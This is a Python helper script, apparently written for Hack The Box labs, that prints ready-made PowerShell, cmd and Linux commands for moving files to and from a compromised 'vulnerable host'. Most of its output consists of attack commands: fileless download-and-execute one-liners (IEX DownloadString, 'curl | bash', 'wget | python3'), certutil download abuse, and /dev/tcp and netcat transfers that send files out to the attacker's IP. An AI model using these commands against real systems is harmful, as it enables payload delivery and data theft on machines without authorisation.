#!/usr/bin/python3
import sys
import netifaces

tun0 = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
#if tun0:
#    print(tun0)

try:
    file = sys.argv[1]
    remotepath = sys.argv[2]
    if len(sys.argv) == 4:
        ip_addr = sys.argv[3]
    else:
        ip_addr = tun0
except IndexError:
    print("Usage: {} [file] [\"remotepath\"] [ip_addr (opt)]".format(sys.argv[0]))
    print("file: local filename. Must be hosted python3 -m http.server 80")
    print("\"remotepath\": where to drop the file on the vulnerable host")
    print("ip_addr: IP address. Defaults to tun0 for HTB")
    exit(0)

print("####################################")
print("############ POWERSHELL ############")
print("####################################")
print()
print("-------- PowerShell Upload - Invoke-WebRequest --------")
print("Invoke-WebRequest http://" + ip_addr + "/" + file + " -O " + remotepath)
print("-------- PowerShell Upload - Fileless DownloadString (ps1s) --------")
print("IEX (New-Object System.Net.Webclient).DownloadString('http://" + ip_addr + "/" + file + "')")
print("-------- PowerShell Download - Invoke-FileUpload from external ps1 --------")
print("Link: https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1")
print("Setup: python3 -m uploadserver")
print("IEX(New-Object Net.WebClient).DownloadString('http://" + ip_addr + "/PSUpload.ps1')")
print("Invoke-FileUpload -Uri http://" + ip_addr + ":8000/upload -File " + remotepath)
print("-------- PowerShell Upload - Base64 (8191 char max string length)  --------")
print("cat " + file + " |base64 -w 0;echo")
print("[IO.File]::WriteAllBytes(\"" + remotepath + "\", [Convert]::FromBase64String(\"[BASE64]\"))")
print("-------- PowerShell Download - Base64 --------")
print("[Convert]::ToBase64String((Get-Content -path \"" + remotepath + "\" -Encoding byte))")
print("echo [BASE64] | base64 -d > " + file)

print()
print("#####################################")
print("################ CMD ################")
print("#####################################")
print()

print("-------- Cmd Upload - PowerShell Invoke-WebRequest --------")
print("powershell -c \"Invoke-WebRequest http://" + ip_addr + "/" + file + " -O " + remotepath + "\"")
print("-------- Cmd Upload - Certutil.exe --------")
print("certutil.exe -urlcache -split -f http://" + ip_addr + "/" + file + " " + remotepath)

print()
print("###################################################")
print("### Check notes for more winrm/smb/ftp nonsense ###")
print("###################################################")
print()

print("#####################################")
print("############### Linux ###############")
print("#####################################")
print()

print("-------- Base64 --------")
print("cat " + file + " |base64 -w 0;echo")
print("echo -n '[Base64]' | base64 -d > " + remotepath)
print("-------- wget --------")
print("wget http://" + ip_addr + "/" + file + " -O " + remotepath)
print("-------- curl --------")
print("curl -o " + remotepath + " http://" + ip_addr + "/" + file)
print("-------- fileless wget (out to python3 or any other program)  --------")
print("wget -qO- http://" + ip_addr + "/" + file + " | python3")
print("-------- fileless curl (out to bash or any other program)  --------")
print("curl http://" + ip_addr + "/" + file + " | bash")
print("-------- download with bash (scuffed bypass for locked-down systems) --------")
print("exec 3<>/dev/tcp/" + ip_addr + "/80")
print("echo -e \"GET /" + file + " HTTP/1.1\\n\\n\">&3")
print("cat <&3")
print("-------- netcat --------")
print("nc -lvnp 6666 > " + remotepath)
print("nc " + ip_addr + " 6666 < " + file)
print("-------- netcat to no netcat --------")
print("sudo nc -l -p 443 -q 0 < " + file)
print("cat < /dev/tcp/" + ip_addr + "/443 > " + remotepath)
print("-------- no netcat to netcat --------")
print("nc -lvnp 443 > " + remotepath)
print("cat " + file + " > /dev/tcp/" + ip_addr + "/443")


print()
print("#################################################")
print("### Check notes for more niche file transfer  ###")
print("### methods, like https (good for real-life), ###")
print("### scp, and other stuff. :)                  ###") 
print("### Made with <3 and >:3 by Kaden H           ###") 
print("#################################################")
print()


